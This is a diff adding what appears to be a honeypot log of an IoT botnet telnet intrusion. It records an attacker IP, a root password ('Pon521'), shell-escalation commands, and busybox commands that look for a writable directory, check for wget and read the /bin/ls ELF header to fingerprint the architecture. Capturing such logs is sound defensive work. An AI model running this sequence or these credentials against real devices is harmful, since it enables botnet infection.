@@ -1,0 +1,17 @@
+from: 178.72.76.110:6773 user:root password:Pon521
+start
+enable
+config terminal
+system
+linuxshell
+su
+shell
+sh
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x46\x57\x49\x44\x41\x50'
+/bin/busybox wget;/bin/busybox echo -ne '\x46\x57\x49\x44\x41\x50'
+/bin/busybox cat /bin/ls|head -n 1
+/bin/busybox hexdump -e '16/1 "%c"' -n 52 /bin/ls
+/bin/busybox cat /bin/ls|more
+dd bs=52 count=1 if=/bin/ls || cat /bin/ls || while read i; do echo $i; done < /bin/ls || while read i; do echo $i; done < /bin/busybox
+/bin/busybox dd bs=52 count=1 if=/bin/ls || /bin/busybox cat /bin/ls || while read i; do printf $i; done < /bin/ls || while read i; do printf $i; done < /bin/busybox
+[eof]
